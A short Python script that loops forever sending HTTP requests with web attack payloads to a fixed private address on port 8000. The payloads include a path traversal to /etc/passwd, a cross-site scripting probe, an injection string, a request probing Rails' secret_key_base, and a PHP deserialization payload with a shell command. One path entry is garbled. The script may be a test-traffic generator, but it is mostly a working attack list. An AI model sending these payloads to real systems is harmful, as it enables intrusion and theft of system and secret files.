import requests
import time

def make_request(ip):
    port = 8000
    path = ["/cgi-mod/view_help.cgi?locale=/..//../..//../..//../..//../..//etc/passwd",
            "/railo-context/admin/update.cfm?ADMINTYPE=admin<svg/onload=alert(1)>",
            "/robots.txt",
            "/main/index?username=admin%27qVZUXs%3C%27%22%3EHNRVEx",
            "/eval(Rails.application.secrets.secret_key_base)",
            "/‘/o:987:/i’, $var",
            "/vulnerable.php?data=O:8:\"stdClass\":1:{s:4:\"cmd\";s:2:\"ls\";}",]



    for i in range(len(path)):
        url = f"http://{ip}:{port}{path[i]}"
        response = requests.get(url)

        time.sleep(1)


if __name__ == "__main__":

    while True:
        make_request('192.168.10.65')
